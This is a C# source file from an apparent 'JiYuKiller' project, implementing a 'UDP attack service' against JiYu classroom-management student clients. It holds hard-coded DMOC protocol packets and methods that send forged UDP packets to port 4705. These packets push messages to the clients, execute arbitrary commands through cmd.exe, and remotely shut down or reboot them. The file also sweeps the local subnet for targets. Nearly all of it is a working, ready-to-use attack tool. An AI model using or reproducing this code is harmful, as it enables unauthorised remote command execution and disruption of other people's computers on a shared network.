using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace JiYuKiller.Services
{
    /// <summary>
    /// 极域UDP攻击服务 - 移植自原项目 JyUdpAttack
    /// 功能: 局域网扫描 + 发送消息/命令/关机/重启
    /// 协议: DMOC (0x44 0x4d 0x4f 0x43) UDP 4705
    /// </summary>
    public class UdpAttackService
    {
        private static readonly Lazy<UdpAttackService> _instance = new Lazy<UdpAttackService>(() => new UdpAttackService());
        public static UdpAttackService Instance => _instance.Value;

        // 原项目4个硬编码基础包 (DMOC协议)
        // BASE_PACK_MSG: 发送消息
        // BASE_PACK_CMD: 发送命令
        // BASE_PACK_REBOOT: 远程重启
        // BASE_PACK_SHUTDOWN: 远程关机
        private static readonly byte[][] BasePackets = new byte[][]
        {
            // MSG (偏移56处写入消息内容, UTF-16LE)
            new byte[]
            {
                0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0x9e,0x03,0x00,0x00,0x10,0x41,0xaf,0xfb,
                0xa0,0xe7,0x52,0x40,0x91,0xdc,0x27,0xa3,0xb6,0xf9,0x29,0x2e,0x20,0x4e,0x00,0x00,
                0xc0,0xa8,0x50,0x81,0x91,0x03,0x00,0x00,0x91,0x03,0x00,0x00,0x00,0x08,0x00,0x00,
                0x00,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            },
            // CMD (偏移100处写入命令, UTF-16LE)
            new byte[]
            {
                0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0x6e,0x03,0x00,0x00,0x39,0x8e,0xd2,0x7c,
                0x8b,0x56,0x0d,0x45,0x9c,0x60,0xe0,0xd0,0xc4,0xa4,0xb3,0xf2,0x20,0x4e,0x00,0x00,
                0xc0,0xa8,0x50,0x81,0x61,0x03,0x00,0x00,0x61,0x03,0x00,0x00,0x00,0x02,0x00,0x00,
                0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x43,0x00,0x3a,0x00,
                0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,
                0x5c,0x00,0x73,0x00,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x6d,0x00,0x33,0x00,
                0x32,0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x63,0x00,0x6d,0x00,0x64,0x00,
                0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            },
            // REBOOT
            new byte[]
            {
                0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0x2a,0x02,0x00,0x00,0xbf,0x40,0x22,0x4e,
                0x57,0x2d,0x3e,0x4f,0x9b,0x6f,0xc1,0x8d,0xe1,0xeb,0x4f,0x62,0x20,0x4e,0x00,0x00,
                0xc0,0xa8,0x50,0x81,0x1d,0x02,0x00,0x00,0x1d,0x02,0x00,0x00,0x00,0x02,0x00,0x00,
                0x00,0x00,0x00,0x00,0x13,0x00,0x00,0x10,0x0f,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x59,0x65,0x08,0x5e,0x06,0x5c,0xcd,0x91,0x2f,0x54,0xa8,
                0x60,0x84,0x76,0xa1,0x8b,0x97,0x7b,0x3a,0x67,0x02,0x30,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            },
            // SHUTDOWN
            new byte[]
            {
                0x44,0x4d,0x4f,0x43,0x00,0x00,0x01,0x00,0x2a,0x02,0x00,0x00,0xc8,0xe3,0x97,0xfd,
                0xc0,0xb5,0x9f,0x45,0x87,0x72,0x05,0xbd,0x4e,0x46,0xa8,0x96,0x20,0x4e,0x00,0x00,
                0xc0,0xa8,0x50,0x81,0x1d,0x02,0x00,0x00,0x1d,0x02,0x00,0x00,0x00,0x02,0x00,0x00,
                0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x10,0x0f,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x59,0x65,0x08,0x5e,0x06,0x5c,0x73,0x51,0xed,0x95,0xa8,
                0x60,0x84,0x76,0xa1,0x8b,0x97,0x7b,0x3a,0x67,0x02,0x30,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
            }
        };

        private const int PackBufferSize = 128;
        private const int SendBufferSize = 1024;
        private const int DefaultPort = 4705;

        // 数据包类型索引
        private const int BasePackMsg = 0;
        private const int BasePackCmd = 1;
        private const int BasePackReboot = 2;
        private const int BasePackShutdown = 3;

        public event Action<string> OnLog;
        public event Action<List<NetworkHost>> OnScanComplete;

        private bool _isScanning = false;

        /// <summary>
        /// 发送消息到目标IP
        /// 对应原项目 JyUdpAttack::SendText
        /// </summary>
        public void SendText(string ip, int port, string message)
        {
            Logger.Instance.FunctionCall("UdpAttackService.SendText");
            Logger.Instance.Info($"[UDP攻击] 发送消息 -> {ip}:{port} : {message}");

            byte[] data = new byte[SendBufferSize];
            Array.Copy(BasePackets[BasePackMsg], data, PackBufferSize);

            // 消息内容写入偏移56, UTF-16LE (对应原项目 memcpy_s(task->data + 56, ...))
            byte[] msgBytes = Encoding.Unicode.GetBytes(message);
            int copyLen = Math.Min(msgBytes.Length, SendBufferSize - 56);
            Array.Copy(msgBytes, 0, data, 56, copyLen);

            SendUdpPacket(ip, port, data, $"MSG => {message}");
        }

        /// <summary>
        /// 发送命令到目标IP
        /// 对应原项目 JyUdpAttack::SendCommand
        /// </summary>
        public void SendCommand(string ip, int port, string command)
        {
            Logger.Instance.FunctionCall("UdpAttackService.SendCommand");
            Logger.Instance.Info($"[UDP攻击] 发送命令 -> {ip}:{port} : {command}");

            byte[] data = new byte[SendBufferSize];
            Array.Copy(BasePackets[BasePackCmd], data, PackBufferSize);

            // 命令内容写入偏移100, UTF-16LE (对应原项目 memcpy_s(task->data + 100, ...))
            byte[] cmdBytes = Encoding.Unicode.GetBytes(command);
            int copyLen = Math.Min(cmdBytes.Length, SendBufferSize - 100);
            Array.Copy(cmdBytes, 0, data, 100, copyLen);

            SendUdpPacket(ip, port, data, $"CMD => {command}");
        }

        /// <summary>
        /// 发送关机指令
        /// 对应原项目 JyUdpAttack::SendShutdown
        /// </summary>
        public void SendShutdown(string ip, int port)
        {
            Logger.Instance.FunctionCall("UdpAttackService.SendShutdown");
            Logger.Instance.Info($"[UDP攻击] 远程关机 -> {ip}:{port}");

            byte[] data = new byte[SendBufferSize];
            Array.Copy(BasePackets[BasePackShutdown], data, PackBufferSize);

            SendUdpPacket(ip, port, data, "=> shutdown");
        }

        /// <summary>
        /// 发送重启指令
        /// 对应原项目 JyUdpAttack::SendReboot
        /// </summary>
        public void SendReboot(string ip, int port)
        {
            Logger.Instance.FunctionCall("UdpAttackService.SendReboot");
            Logger.Instance.Info($"[UDP攻击] 远程重启 -> {ip}:{port}");

            byte[] data = new byte[SendBufferSize];
            Array.Copy(BasePackets[BasePackReboot], data, PackBufferSize);

            SendUdpPacket(ip, port, data, "=> reboot");
        }

        /// <summary>
        /// 发送UDP包 (核心方法, 对应原项目 SendThread)
        /// </summary>
        private void SendUdpPacket(string ip, int port, byte[] data, string description)
        {
            Task.Run(() =>
            {
                try
                {
                    OnLog?.Invoke($"[{ip}:{port}] {description} == 开始发送");

                    using (UdpClient client = new UdpClient())
                    {
                        client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), port);
                        int sent = client.Send(data, data.Length, endPoint);
                        OnLog?.Invoke($"[{ip}:{port}] {description} == 发送成功。{sent} 字节");
                        Logger.Instance.Info($"[UDP攻击] 发送成功 {sent} 字节 -> {ip}:{port}");
                    }
                }
                catch (Exception ex)
                {
                    OnLog?.Invoke($"[{ip}:{port}] {description} == 发送失败: {ex.Message}");
                    Logger.Instance.Error($"[UDP攻击] 发送失败 -> {ip}:{port}", ex);
                }
            });
        }

        /// <summary>
        /// 扫描局域网 (对应原项目 ScanNetworkIP)
        /// 使用ARP + ICMP扫描同网段在线主机
        /// 借鉴teacher_sim的get_ip()获取本机IP思路
        /// </summary>
        public void ScanNetwork()
        {
            if (_isScanning)
            {
                OnLog?.Invoke("扫描正在进行中，请等待...");
                return;
            }

            _isScanning = true;
            OnLog?.Invoke("开始扫描局域网...");

            Task.Run(() =>
            {
                try
                {
                    // 获取本机IP (借鉴teacher_sim get_ip()思路)
                    string localIp = GetLocalIP();
                    if (string.IsNullOrEmpty(localIp))
                    {
                        OnLog?.Invoke("错误: 无法获取本机IP");
                        _isScanning = false;
                        return;
                    }

                    OnLog?.Invoke($"本机IP: {localIp}");

                    string[] parts = localIp.Split('.');
                    string subnet = parts[0] + "." + parts[1] + "." + parts[2];
                    OnLog?.Invoke($"正在扫描 {subnet}.1 - {subnet}.254 ...");

                    List<NetworkHost> hosts = new List<NetworkHost>();

                    // 并行扫描 (对应原项目 ScanNetworkIPSubTaskThread)
                    Parallel.For(1, 255, i =>
                    {
                        string scanIp = subnet + "." + i;
                        try
                        {
                            Ping ping = new Ping();
                            PingReply reply = ping.Send(scanIp, 200);
                            if (reply.Status == IPStatus.Success)
                            {
                                string hostName = "";
                                try
                                {
                                    IPHostEntry entry = Dns.GetHostEntry(scanIp);
                                    hostName = entry.HostName;
                                }
                                catch { }

                                lock (hosts)
                                {
                                    hosts.Add(new NetworkHost { IP = scanIp, HostName = hostName });
                                }
                            }
                        }
                        catch { }
                    });

                    hosts.Sort((a, b) =>
                    {
                        string[] aParts = a.IP.Split('.');
                        string[] bParts = b.IP.Split('.');
                        return int.Parse(aParts[3]).CompareTo(int.Parse(bParts[3]));
                    });

                    OnLog?.Invoke($"扫描完成，共发现 {hosts.Count} 台主机");
                    OnScanComplete?.Invoke(hosts);
                }
                catch (Exception ex)
                {
                    OnLog?.Invoke($"扫描失败: {ex.Message}");
                    Logger.Instance.Error("[UDP攻击] 局域网扫描失败", ex);
                }
                finally
                {
                    _isScanning = false;
                }
            });
        }

        /// <summary>
        /// 获取本机IP (借鉴teacher_sim get_ip()思路)
        /// </summary>
        private string GetLocalIP()
        {
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    return endPoint?.Address.ToString();
                }
            }
            catch
            {
                // fallback: 遍历网络接口
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up &&
                        ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            {
                                return ip.Address.ToString();
                            }
                        }
                    }
                }
                return null;
            }
        }

        /// <summary>
        /// 检测极域学生端TCP端口 (对应原项目 CheckStudentMainTCPPort)
        /// </summary>
        public int CheckStudentMainTCPPort()
        {
            Logger.Instance.FunctionCall("UdpAttackService.CheckStudentMainTCPPort");
            OnLog?.Invoke("正在检测极域TCP端口...");

            try
            {
                // 常见极域端口
                int[] ports = { 4705, 4988, 4806 };
                foreach (int port in ports)
                {
                    try
                    {
                        using (TcpClient client = new TcpClient())
                        {
                            IAsyncResult result = client.BeginConnect("127.0.0.1", port, null, null);
                            bool success = result.AsyncWaitHandle.WaitOne(500);
                            if (success && client.Connected)
                            {
                                OnLog?.Invoke($"发现极域端口: {port}");
                                Logger.Instance.Info($"[UDP攻击] 检测到极域TCP端口: {port}");
                                client.Close();
                                return port;
                            }
                            client.Close();
                        }
                    }
                    catch { }
                }
                OnLog?.Invoke("未发现极域相关端口（常见 4705/4988）");
                return -1;
            }
            catch (Exception ex)
            {
                OnLog?.Invoke($"端口检测失败: {ex.Message}");
                return -1;
            }
        }
    }

    /// <summary>
    /// 网络主机信息
    /// </summary>
    public class NetworkHost
    {
        public string IP { get; set; }
        public string HostName { get; set; }
        public override string ToString()
        {
            return string.IsNullOrEmpty(HostName) ? IP : $"{IP} ({HostName})";
        }
    }
}
